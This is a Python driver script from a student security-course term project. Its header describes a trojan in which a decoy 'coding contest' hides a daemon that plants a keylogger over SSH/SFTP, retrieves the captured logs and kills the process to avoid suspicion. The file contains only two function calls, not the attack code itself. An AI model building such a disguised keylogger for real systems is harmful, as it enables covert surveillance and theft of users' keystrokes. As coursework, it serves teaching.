#!/usr/bin/python3

# ==============================================================================
#      Assignment:  DPI912 Term Project
#      File: SSH Client Runner
#
#      Authors: Sang Min Park, Jacky Tea
#      Student ID (Sang Min Park): 124218173
#      Student ID (Jacky Tea): 152078168
#      Language: Python3
#      Libraries Used:
#
#      To compile with python3 >>> python3 contestContest.py
#      To compile with executable >>> chmod 700 contestContest.py
#                                 >>> ./contestContest.py
#
#      Class: DPI912 NSB - Python for Programmers: Sockets and Security
#      Professor: Professor Harvey Kaduri
#      Due Date: Friday, December 6, 2019, 5:50 PM EST
#      Submitted:
#
# -----------------------------------------------------------------------------
#
#      Cookbook code utilized from the following source:
#      https://github.com/dabeaz/python-cookbook/blob/master/src/12/launching_a_daemon_process_on_unix/daemon.py
#
#      Description: Driver program for codingContest.py
#
#      Input: No command line or user input necessary.
#
#      Output: A file called in 'contestUtil.log' in the current directory containing
#      error messages and information such as received messages over the SSH connection.
#
#      Algorithm: A non malicious 'coding contest' is started to print arbitrary messages
#      to the screen, then a malicious daemon is forked off which grabs keylogger file
#      contents via SFTP into a file that will be executed via remotely via SSH commands.
#      The contents of the logs are sent back via SFTP and a SSH command kills the keylogger
#      remotely as to not arouse any suspicion of background processes.
#
#      Required Features Not Included:
#
#      Known Bugs:
#
# ==============================================================================

import contestUtil

# main thread
if __name__ == '__main__':
    contestUtil.runContest()
    contestUtil.makeSocketConnection()
